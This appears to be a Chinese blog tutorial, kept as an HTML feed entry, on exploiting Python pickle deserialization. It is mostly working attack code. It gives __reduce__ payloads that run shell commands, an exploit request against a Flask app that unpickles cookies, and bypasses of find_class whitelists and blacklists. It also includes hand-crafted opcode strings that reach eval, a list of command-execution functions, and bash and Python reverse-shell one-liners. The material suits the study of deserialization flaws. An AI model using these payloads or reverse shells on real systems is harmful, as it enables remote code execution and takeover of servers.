    <content type="html"><![CDATA[<h2 id="反序列化库"><a href="#反序列化库" class="headerlink" title="反序列化库"></a>反序列化库</h2><p>python 序列化和反序列化使用最为频繁的是<code>cPickle</code>和<code>pickle</code>，前者是C语言实现，据说速度比后者快很多。</p><p>只不过python3标准库中不再叫<code>cPickle</code>，而是只有<code>pickle</code>。python2中两者都有。</p><p>python2中的序列化文件如果想在python3中读取，需要修改编码。</p><pre class="line-numbers language-none"><code class="language-none">#python2with open(&#39;mnist.pkl&#39;, &#39;rb&#39;) as f:    l &#x3D; list(pickle.load(f))        #python3with open(&#39;mnist.pkl&#39;, &#39;rb&#39;) as f:    u &#x3D; pickle._Unpickler(f)    u.encoding &#x3D; &#39;latin1&#39;    p &#x3D; u.load()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除此之外，还有一些其他的第三方序列化库，比如</p><pre class="line-numbers language-none"><code class="language-none"># marshmallowpip3 install marshmallow# MessagePackpip3 install msgpack-python<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h2><h3 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h3><p>问题是序列化为什么会产生漏洞，是序列化本身处理有问题，被外来的EXP攻击导致漏洞执行了嘛。因为<code>pickle</code>允许我们用数据表示任意对象。官方也在一开始就表述问题的严重性。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200426165819294.png" alt="image-20200426165819294"></p><p><code>pickle</code>允许任意对象通过定义<code>__reduce__</code>方法来声明它是如何被压缩的，一般来说这个方法是返回一个字符串或是一个元祖。</p><pre class="line-numbers language-none"><code class="language-none">__reduce__被定义之后，当对象被Pickle时就会被调用要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用__reduce_ex__首先查看是否存在__reduce_ex__,如果存在则不再查找__reduce__，不存在的话则继续查找__reduce__<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用构造一个存在漏洞的简单代码：</p><pre class="line-numbers language-none"><code class="language-none">#encoding: utf-8import osimport pickleclass test(object):    def __reduce__(self):        return (os.system,(&#39;whoami&#39;,))a&#x3D;test()payload&#x3D;pickle.dumps(a)print payloadpickle.loads(payload)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在python2和python3的输出为：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200426171205336.png" alt="image-20200426171205336"></p><p>其中代表的含义</p><pre class="line-numbers language-none"><code class="language-none"># \x80：协议头声明 \x03：协议版本# \x06\x00\x00\x00：数据长度：6  -&gt;  whoami# whoami：数据# q：储存栈顶的字符串长度：一个字节（即\x00）# \x00：栈顶位置# . ：数据截止# c：读取新的一行作为模块名module，读取下一行作为对象名object，nt -&gt;windows，posix -&gt; linux# (：将一个标记对象插入到堆栈中。# S: 实例化一个字符串对象# p：将堆栈中索引为-1的对应存储入内存。# t：构建元组压入堆栈。# R：将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果需要在web中请求传输，url编码后就可以发送了。</p><p>如果使用的是<code>__reduce_ex__</code></p><pre class="line-numbers language-none"><code class="language-none">#encoding: utf-8import osimport pickleclass test(object):    def __init__(self, cmd):        self.cmd &#x3D; cmd    def __reduce_ex__(self,cmd):        return (os.system,(self.cmd,))a&#x3D;test(&#39;whoami&#39;)payload&#x3D;pickle.dumps(a)print(payload)pickle.loads(payload)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中<code>pickle.loads</code>是会解决import 问题，对于未引入的module会自动尝试import。那么也就是说整个python标准库的代码执行、命令执行函数我们都可以使用。有人整理的执行命令函数。</p><pre class="line-numbers language-none"><code class="language-none">eval, execfile, compile, open, file, map, input,os.system, os.popen, os.popen2, os.popen3, os.popen4, os.open, os.pipe,os.listdir, os.access,os.execl, os.execle, os.execlp, os.execlpe, os.execv,os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe,os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe,pickle.load, pickle.loads,cPickle.load,cPickle.loads,subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,commands.getstatusoutput,commands.getoutput,commands.getstatus,glob.glob,linecache.getline,shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,dircache.listdir,dircache.opendir,io.open,popen2.popen2,popen2.popen3,popen2.popen4,timeit.timeit,timeit.repeat,sys.call_tracing,code.interact,code.compile_command,codeop.compile_command,pty.spawn,posixfile.open,posixfile.fileopen,platform.popen<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以及不常用的命令执行函数</p><pre class="line-numbers language-none"><code class="language-none">map(__import__(&#39;os&#39;).system,[&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#39;,])sys.call_tracing(__import__(&#39;os&#39;).system,(&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;12345 0&lt;&amp;1 2&gt;&amp;1&quot;&#39;,))platform.popen(&quot;python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([\&quot;&#x2F;bin&#x2F;sh\&quot;,\&quot;-i\&quot;]);&#39;&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果想手动编写opcode，可用查看<a href="https://xz.aliyun.com/t/7436#toc-11%E3%80%82%E6%96%87%E7%AB%A0%E8%AF%A6%E7%BB%86%E4%BB%8B%E7%BB%8D%E4%BA%86pickle%E7%9A%84%E5%8E%9F%E7%90%86%E5%92%8C%E5%BA%8F%E5%88%97%E5%8C%96%E5%80%BC%E7%9A%84%E5%90%AB%E4%B9%89%E3%80%82">https://xz.aliyun.com/t/7436#toc-11。文章详细介绍了pickle的原理和序列化值的含义。</a></p><p><code>pickle</code>库中针对序列化和反序列化的方法有</p><pre class="line-numbers language-none"><code class="language-none">pickle.dump()   #传入一个文件句柄，以二进制的形式写入pickle.dumps()   #参数为字符串，返回一个序列化的byte对象pickle.load()   #同样是操作文件句柄，以二进制形式读取pickle.loads()   #直接从bytes对象中读取序列化值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>还有面向对象的反序列化类。这个类后面会被用到<code>pickle.Unpickler</code>。方法和上面一致操作文件。</p><pre class="line-numbers language-none"><code class="language-none">f &#x3D; open(fileName, &quot;rb&quot;)d &#x3D; pickle.Unpickler(f)data &#x3D; d.load()f.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200427102136100.png" alt="image-20200427102136100"></p><p>带有的方法为<code>&#39;find_class&#39;, &#39;load&#39;, &#39;memo&#39;, &#39;persistent_load&#39;</code></p><p>面向对象的序列化类。<code>pickle.Pickler</code>，其中方法<code>&#39;bin&#39;, &#39;clear_memo&#39;, &#39;dispatch_table&#39;, &#39;dump&#39;, &#39;fast&#39;, &#39;memo&#39;, &#39;persistent_id&#39;</code></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200427102434470.png" alt="image-20200427102434470"></p><h3 id="pickle-payload"><a href="#pickle-payload" class="headerlink" title="pickle payload"></a>pickle payload</h3><p>上面都是提到的<code>pickle</code>的函数和序列化、反序列化的东西，现在用一个简单的场景来看一下payload。</p><pre class="line-numbers language-none"><code class="language-none">import pickleimport base64from flask import Flask, requestapp &#x3D; Flask(__name__)@app.route(&quot;&#x2F;&quot;)def index():    try:        user &#x3D; base64.b64decode(request.cookies.get(&#39;user&#39;))        user &#x3D; pickle.loads(user)        username &#x3D; user[&quot;username&quot;]    except:        username &#x3D; &quot;Guest&quot;    return &quot;Hello %s&quot; % usernameif __name__ &#x3D;&#x3D; &quot;__main__&quot;:    app.run()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当执行</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; class exp(object):...     def __reduce__(self):...             return (os.system,(&#39;whoami&#39;,))...&gt;&gt;&gt; e &#x3D; exp()&gt;&gt;&gt; s &#x3D; pickle.dumps(e)&gt;&gt;&gt; response &#x3D; requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:5000&#x2F;&quot;, cookies&#x3D;dict(user&#x3D;base64.b64encode(s).decode()))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200427134049774.png" alt="image-20200427134049774"></p><h3 id="Unpickler-find-class"><a href="#Unpickler-find-class" class="headerlink" title="Unpickler find_class()"></a>Unpickler find_class()</h3><p>当然对于这种无限制的任意对象调用，官方也有一定的解决办法，定制<code>find_class()</code>来控制要解封的对象。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200509163651496.png" alt="image-20200509163651496"></p><p>比如如下的一个例子：</p><pre class="line-numbers language-none"><code class="language-none">import ioimport picklesafe_builtins &#x3D; &#123;   #白名单    &#39;range&#39;,    &#39;complex&#39;,    &#39;set&#39;,    &#39;frozenset&#39;,    &#39;slice&#39;,&#125;class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        # Only allow safe classes from builtins.        if module &#x3D;&#x3D; &quot;builtins&quot; and name in safe_builtins:               return getattr(builtins, name)        # Forbid everything else.        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; %                                     (module, name))def restricted_loads(s):    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;    return RestrictedUnpickler(io.BytesIO(s)).load()   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么用这种方式来处理上面的漏洞代码</p><pre class="line-numbers language-none"><code class="language-none">import pickleimport ioimport builtinsimport base64from flask import Flask, requestapp &#x3D; Flask(__name__)@app.route(&quot;&#x2F;&quot;)def index():    try:        user &#x3D; base64.b64decode(request.cookies.get(&#39;user&#39;))        user &#x3D; pickle.loads(user)        username &#x3D; user[&quot;username&quot;]    except:        username &#x3D; &quot;Guest&quot;    return &quot;Hello %s&quot; % username        @app.route(&quot;&#x2F;user&quot;)def user():    try:        user &#x3D; base64.b64decode(request.cookies.get(&#39;user&#39;))        user &#x3D; restricted_loads(user)        username &#x3D; user[&quot;username&quot;]    except:        username &#x3D; &quot;Guest&quot;    return &quot;Hello %s&quot; % username        class RestrictedUnpickler(pickle.Unpickler):    safe_list &#x3D; &#123;        &#39;range&#39;,        &#39;slice&#39;,        &#39;set&#39;    &#125;    def find_class(self, module, name):        if module &#x3D;&#x3D; &#39;builtins&#39; and name in safe_list:            return getattr(builtins, name)        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; %(module, name))def restricted_loads(s):    return RestrictedUnpickler(io.BytesIO(s)).load()            if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    app.run()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>user</code>路径下，<code>os</code>模块的命令执行就不能使用了。准确的说只能考虑<code>builtins.*</code>的形式</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200427141531306.png" alt="image-20200427141531306"></p><p>那么先来看一个这个函数是怎么调用的，查看文件</p><p><a href="https://github.com/python/cpython/blob/9412f4d1ad28d48d8bb4725f05fd8f8d0daf8cd2/Lib/pickle.py">https://github.com/python/cpython/blob/9412f4d1ad28d48d8bb4725f05fd8f8d0daf8cd2/Lib/pickle.py</a></p><p>当读取到第一个字符c的时候，也就是模块名，调用的是<code>load_global</code>方法，查找此方法。</p><pre class="line-numbers language-none"><code class="language-none">def load_global(self):        module &#x3D; self.readline()[:-1].decode(&quot;utf-8&quot;)        name &#x3D; self.readline()[:-1].decode(&quot;utf-8&quot;)        klass &#x3D; self.find_class(module, name)        self.append(klass)    dispatch[GLOBAL[0]] &#x3D; load_global<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把第一参数当作模块，第二个参数当作属性传入<code>find_class</code>中。而<code>find_class</code>：</p><pre class="line-numbers language-none"><code class="language-none">def find_class(self, module, name):        # Subclasses may override this.        sys.audit(&#39;pickle.find_class&#39;, module, name)        if self.proto &lt; 3 and self.fix_imports:            if (module, name) in _compat_pickle.NAME_MAPPING:                module, name &#x3D; _compat_pickle.NAME_MAPPING[(module, name)]            elif module in _compat_pickle.IMPORT_MAPPING:                module &#x3D; _compat_pickle.IMPORT_MAPPING[module]        __import__(module, level&#x3D;0)        if self.proto &gt;&#x3D; 4:            return _getattribute(sys.modules[module], name)[0]        else:            return getattr(sys.modules[module], name)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中的代码看起来有点不好理解，其实就是表述官方的导入模块的限制，比如python2中写法</p><pre class="line-numbers language-none"><code class="language-none">def find_class(self, module, name):       __import__(module)       mod &#x3D; sys.modules[module]       klass &#x3D; getattr(mod, name)       return klass<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到<code>__import__</code>就大概可以理解，上面说的为啥<code>pickle</code>会自动解决导入的问题。那么这个怎么绕过呢，如果是按照官方给的例子，绕过的形式暂时没有发现。如果按照类似如下限制，<code>find_class</code>的限制仅仅是对该函数参数过滤，并没有hook <code>__import__</code>等函数，所以通过<code>eval(&#39;__import__(\&#39;xx\&#39;)&#39;)</code>等即可绕过。</p><pre class="line-numbers language-none"><code class="language-none">import ioimport picklesafe_builtins &#x3D; &#123;   #白名单    &#39;range&#39;,    &#39;complex&#39;,    &#39;set&#39;,    &#39;frozenset&#39;,    &#39;slice&#39;,&#125;class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        # Only allow safe classes from builtins.        if module &#x3D;&#x3D; &quot;builtins&quot;:               return getattr(builtins, name)        # Forbid everything else.        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; %                                     (module, name))def restricted_loads(s):    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;    return RestrictedUnpickler(io.BytesIO(s)).load()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也就是必须在<code>builtins</code>模块下执行，那么其中哪些函数我们可以调用,python3</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200428111024908.png" alt="image-20200428111024908"></p><pre class="line-numbers language-none"><code class="language-none">builtins.__getattribute__(&#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)builtins.getattr(builtins, &#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>是不是有点沙箱逃逸的感觉了，虽然并不一样。</p><h3 id="new-classobj"><a href="#new-classobj" class="headerlink" title="new.classobj"></a>new.classobj</h3><p>python2中的旧式类型，python3中已经弃用，使用<code>type</code>来代替<code>classobj</code>。做用是创建一个新的类型对象。</p><p>使用方法：</p><pre class="line-numbers language-none"><code class="language-none">classobj(&#39;className&#39;,(baseClass,),&#123;dictAttr:dictValue,...&#125;)from new import classobjmyClass&#x3D; classobj(&quot;HelloClass&quot;, (object, ), &#123;&quot;name&quot;:&quot;boy&quot;, &quot;school&quot;:&quot;hn&quot;&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200430093434147.png" alt="image-20200430093434147"></p><p>看到类的名称并不是定义的<code>classobj</code>中的className参数。如果在python2下，如何利用这个模块来执行命令呢。</p><pre class="line-numbers language-none"><code class="language-none">classobj(&#39;system&#39;, (), &#123;&#39;__getinitargs__&#39;:lambda self,arg&#x3D;(&#39;whoami&#39;,):arg, &#39;__module__&#39;: &#39;os&#39;&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>构造一条完整的命令</p><pre class="line-numbers language-none"><code class="language-none">payload2 &#x3D; pickle.dumps(classobj(&#39;system&#39;, (), &#123;&#39;__getinitargs__&#39;:lambda self,arg&#x3D;(&#39;whoami&#39;,):arg, &#39;__module__&#39;: &#39;os&#39;&#125;)())pickle.loads(payload2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="手写opcode"><a href="#手写opcode" class="headerlink" title="手写opcode"></a>手写opcode</h3><p>没有看上面提到的那个文章的，可以先看看这一篇<a href="https://xz.aliyun.com/t/7012%E3%80%82%E4%B8%BB%E8%A6%81%E4%BB%8B%E7%BB%8D%E4%BA%86%E5%9C%A8python2%E4%B8%8B%E7%9A%84%E6%9E%84%E9%80%A0%EF%BC%8C%E4%B8%8B%E9%9D%A2%E4%B8%BB%E8%A6%81%E4%BD%BF%E7%94%A8python3%EF%BC%8C%E4%B8%8D%E8%BF%87%E4%BB%8D%E7%84%B6%E5%8F%AF%E4%BB%A5%E5%8F%82%E8%80%83%E3%80%82opcode%E7%89%88%E6%9C%AC%E5%90%91%E4%B8%8B%E5%85%BC%E5%AE%B9%EF%BC%8C%E6%89%80%E4%BB%A5%E8%A6%81%E6%98%AF%E4%BA%86%E8%A7%A30%E7%89%88%E6%9C%AC%E7%9A%84opcode%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%9C%A8python3%E4%B8%AD%E4%BD%BF%E7%94%A8%E3%80%82">https://xz.aliyun.com/t/7012。主要介绍了在python2下的构造，下面主要使用python3，不过仍然可以参考。opcode版本向下兼容，所以要是了解0版本的opcode，也可以在python3中使用。</a></p><p>python3中的opcode：<a href="https://github.com/python/cpython/blob/3.8/Lib/pickle.py">https://github.com/python/cpython/blob/3.8/Lib/pickle.py</a></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200428142817753.png" alt="image-20200428142817753"></p><p>为啥需要手写opcode，假设我们想执行如下命令，在内建函数中引用形式如下，如果有一个黑名单禁用<code>eval</code>，那么利用<code>__reduce__</code>就不能使用了。</p><pre class="line-numbers language-none"><code class="language-none">builtins.getattr(builtins, &#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是在<code>__reduce__</code>生成的序列化字符串，只能执行一个函数，而且在对open传参的过程中，程序会报错。</p><p>不能正常生成序列化字符串，这就需要手写一个序列化字符串。</p><p>在这之前，先看一个简单的opcode是如何构造的。利用<code>pickletools</code>来查看，先利用上面的一串利用脚本</p><pre class="line-numbers language-none"><code class="language-none">import pickletoolsclass exp(object):    def __reduce__(self):        return (os.system,(&#39;whoami&#39;,))e &#x3D; exp()s &#x3D; pickle.dumps(e)pickletools.dis(s)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在python3下生成结果为：</p><pre class="line-numbers language-none"><code class="language-none">b&#39;\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200428140432397.png" alt="image-20200428140432397"></p><pre class="line-numbers language-none"><code class="language-none">0: \x80 PROTO      3            #协议版本             2: c    GLOBAL     &#39;nt system&#39;  #把nt.system对象压栈                 os.system13: q    BINPUT     0            #把对象存储到memo的第0个位置                ...15: X    BINUNICODE &#39;whoami&#39;     #压入一个utf-8的元素参数               &#39;whoami&#39;26: q    BINPUT     1            #存储到memo的第1个位置                     ...28: \x85 TUPLE1                  #将前面的元素参数弹出，组成元组再压栈     (&#39;whoami&#39;,)29: q    BINPUT     2            #将上面的元组存储到memo的第2个位置           ...31: R    REDUCE                  #将对象和元组组合执行，结果压栈          os.system(&#39;whoami&#39;)32: q    BINPUT     3            #存储到memo的第3个位置上                    ...34: .    STOP                    #停止<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跟python2的对比一下</p><pre class="line-numbers language-none"><code class="language-none">cnt                   system                p0                    (S&#39;whoami&#39;            p1                    tp2                   Rp3                   .                     <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200428142904682.png" alt="image-20200428142904682"></p><pre class="line-numbers language-none"><code class="language-none"> 0: c    GLOBAL     &#39;nt system&#39;               #压入对象11: p    PUT        0                         #存储到memo的0位置14: (    MARK                                 #压入一个MARK15: S        STRING     &#39;whoami&#39;              #压入一个字符串25: p        PUT        1                     #存储到memo的1位置28: t        TUPLE      (MARK at 14)          #组合参数成元组，相当于一个右括号29: p    PUT        2                         #存储到memo的第2位置32: R    REDUCE                               #组合对象和元素，结果压栈33: p    PUT        3                         #结果存储到memo的第3位置36: .    STOP                                 #停止<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中的memo是可以去除的，可以进一步省略为</p><pre class="line-numbers language-none"><code class="language-none">cnt                   system                                   (S&#39;whoami&#39;                        tR.   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>从显示上看，明显是0版本更为好构造，既然如此，就用0版本来手写一个</p><pre class="line-numbers language-none"><code class="language-none">builtins.getattr(builtins, &#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>首先保证模块和调用函数</p><pre class="line-numbers language-none"><code class="language-none">cbuiltinsgetattr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>把参数压入，不过其中有个问题，上面压入参数的时候都是字符串，其中却有个对象，如果直接压入明显是报错，要是使用<code>c</code>来导入模块，下面还需要接一个实例，所以这里并不能直接压入单一的对象。也就是需要从某个模块中调用到<code>builtins</code>，例如无限套娃：</p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; builtins.__dict__.get(&#39;globals&#39;)().get(&#39;__builtins__&#39;)&lt;module &#39;__builtins__&#39; (built-in)&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但是这里来回连续调用好几次函数，看起来也不好弄，跟上面联合分开查看</p><pre class="line-numbers language-none"><code class="language-none">get &#x3D; builtins.getattr(builtins.__dict__, &#39;get&#39;)builtins &#x3D; get(&#39;globals&#39;)().get(&#39;__builtins__&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>只不过到此犯了一个错误，过于依赖其中的魔法函数，导致忘记<code>builtins</code>本身就可以直接调用<code>globals</code>。行吧。。。</p><pre class="line-numbers language-none"><code class="language-none">builtins &#x3D; builtins.globals().get(&#39;builtins&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那这里就分块来构造。</p><pre class="line-numbers language-none"><code class="language-none">cbuiltinsglobals             #builtins.globals<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>那么后面调用get函数，这里知道<code>globals</code>获取的实际是一个<code>dict</code>属性对象。如果想使用<code>get</code>，当然也不能直接用，又要先去获取<code>get</code>。</p><pre class="line-numbers language-none"><code class="language-none">cbuiltinsgetattr(cbuiltinsdictS&#39;get&#39;tR.             #builtins.dict.get -&gt; &lt;method &#39;get&#39; of &#39;dict&#39; objects&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再把获取到的<code>get</code>跟上面的函数撮合一下，这里<code>get</code>放在上面，虽说是调用<code>get</code>属性来处理，但是也是在获取到全局属性后，利用<code>get</code>来进行的筛选</p><pre class="line-numbers language-none"><code class="language-none">cbuiltinsgetattr(cbuiltinsdictS&#39;get&#39;tR(cbuiltinsglobals(tRS&#39;builtins&#39;tR.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200429143946265.png" alt="image-20200429143946265"></p><p>记得R后要有跟的后续参数或对象，我也没明白为啥，反正没有就会报错，踩这个坑踩了N久。获取到<code>builtins</code>，再去获取其中的函数。</p><pre class="line-numbers language-none"><code class="language-none">cbuiltinsgetattr(....                #上文获取到的builtinsS&#39;eval&#39;tRp1(S&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;tR.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200429144538320.png" alt="image-20200429144538320"></p><p>在某一个黑名单的过滤中，就可以使用此来绕过，在这种黑名单中<code>__reduce__</code>是会先把<code>builtins.getattr(builtins,&#39;eval&#39;)</code>解释为<code>builtins.eval</code>导致被拦截。</p><pre class="line-numbers language-none"><code class="language-none">#coding:utf-8import ioimport pickleimport builtinsimport osblacklist &#x3D; &#123;    &#39;eval&#39;,    &#39;exec&#39;&#125;class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        # Only allow safe classes from builtins.        if module &#x3D;&#x3D; &quot;builtins&quot; and name not in blacklist:            return getattr(builtins, name)        # Forbid everything else.        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; %                                     (module, name))def restricted_loads(s):    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;    return RestrictedUnpickler(io.BytesIO(s)).load()        class exp(object):    def __reduce__(self):        return (builtins.getattr(builtins,&#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,))# e &#x3D; exp()# s &#x3D; pickle.dumps(e)s &#x3D; b&quot;&quot;&quot;cbuiltinsgetattr(cbuiltinsgetattr(cbuiltinsdictS&#39;get&#39;tR(cbuiltinsglobals(tRS&#39;builtins&#39;tRS&#39;eval&#39;tRp1(S&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;tR.&quot;&quot;&quot;restricted_loads(s)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>到此为了对了黑名单过滤的方法已经取得了部分胜利，opcode不止这些还有很多没用到。</p><p>执行函数的并不只是R，还有O和I，都是小写，比如获取<code>get</code>。</p><pre class="line-numbers language-none"><code class="language-none">#使用o，使用第一个参数作为函数，第二到n个元素作为参数b&quot;&quot;&quot;(cbuiltinsgetattrcbuiltinsdictS&#39;get&#39;o.&quot;&quot;&quot;#使用i,先获取全局函数，在计算mark之后的数据组合为元组作为参数b&quot;&quot;&quot;(cbuiltinsdictS&#39;get&#39;ibuiltinsgetattr.&quot;&quot;&quot;<span aria-hidden="true" 